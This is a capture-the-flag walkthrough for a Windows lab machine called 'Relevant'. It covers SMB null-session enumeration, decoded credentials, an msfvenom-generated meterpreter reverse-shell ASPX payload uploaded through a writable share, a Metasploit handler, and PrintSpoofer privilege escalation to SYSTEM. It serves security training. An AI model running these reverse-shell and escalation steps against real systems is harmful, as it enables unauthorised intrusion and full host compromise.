# Relevant

#Windows 

## Reconnaissance

```
$ nmap 10.66.181.111 -sV -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-14 08:38 -03
Nmap scan report for 10.66.181.106
Host is up (0.13s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: RELEVANT; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.25 seconds
```

## Enumeration

While accessing port `80`, we got this page. 

<figure><img src="relevant-1.png" alt=""><figcaption></figcaption></figure>

Enumerating SMB, we can check if it's vulnerable to Null Session. 

*Null session: A null session is an unauthenticated connection to a Windows system made without a username or password, typically over SMB/CIFS. If enabled, it can allow an attacker to enumerate system information such as users, groups, and shared resources, making it a potential security vulnerability.*

```
$ smbclient -L //10.66.180.69 -N --option='client min protocol=NT1' 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk
```

Accessing `nt4wrksv`, we got a file `passwords.txt`. We can take a look downloading this file or accessing the path at port `49663.`

```
$ smbclient -N \\\\10.66.180.69\\nt4wrksv --option='client min protocol=NT1'

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 4939936 blocks available
smb: \> more passwords.txt
```

```
$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
Bob - !P@$$W0rD!123   

$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$
```

I attempted to connect remotely using `xfreerdp3` but without success.

```
$ xfreerdp3 /u:WORKGROUP\\Bob /p:'!P@$$W0rD!123' /v:10.67.144.15

$rdesktop -u Bob -p '!P@$$W0rD!123' 10.67.144.15
```

I tried to do a full scan and I found additional open ports.

```
$ nmap -sV -Pn -p- 10.67.177.74
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 05:14 EST
Nmap scan report for 10.67.177.74
Host is up (0.13s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49663/tcp open  http          Microsoft IIS httpd 10.0
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RELEVANT; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 246.79 seconds
```

We can see that it's possible access the files.

<figure><img src="relevant-2.png" alt=""><figcaption></figcaption></figure>
## Exploiting

Since we can read the files, we can try to upload a aspx shell to get a shell. I used `msfvenom` to do that.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.183.77 LPORT=1337 -f aspx -o shell.aspx
```

On the target machine.

```
smb: \> put shell.aspx
```

Let's set the configs.

```
msf exploit(multi/handler) > show options 

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.183.77   yes       The listen address (an interface may be specified)
   LPORT     1337             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.
```

When I access the file, I got a shell. 

<figure><img src="relevant-3.png" alt=""><figcaption></figcaption></figure>

*We could also use this shell:*
*{% embed url="https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx" %}*

## Privilege Escalation

Checking for ways to elevate privilege, I first used the following command.

```
c:\Users\Bob\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Finding about `SeImpersonatePrivilege`, I found these articles.

{% embed url="https://www.plesk.com/kb/support/microsoft-windows-seimpersonateprivilege-local-privilege-escalation/" %}

{% embed url="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/" %}

{% embed url="https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0" %}

We can confirm the machine's architecture.

```
meterpreter > sysinfo
Computer        : RELEVANT
OS              : Windows Server 2016 (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
```

We can see that the files are in this folder `c:\inetpub\wwwroot\nt4wrksv`

```
meterpreter > ls
Listing: c:\inetpub\wwwroot\nt4wrksv
====================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100777/rwxrwxrwx  27136  fil   2025-12-15 05:56:23 -0500  PrintSpoofer64.exe
100666/rw-rw-rw-  98     fil   2020-07-25 11:15:33 -0400  passwords.txt
100666/rw-rw-rw-  3690   fil   2025-12-15 05:31:00 -0500  shell.aspx
```

Now we can execute the `PrintSpoofer64.exe` and became `nt authority\system`.

<figure><img src="relevant-4.png" alt=""><figcaption></figcaption></figure>

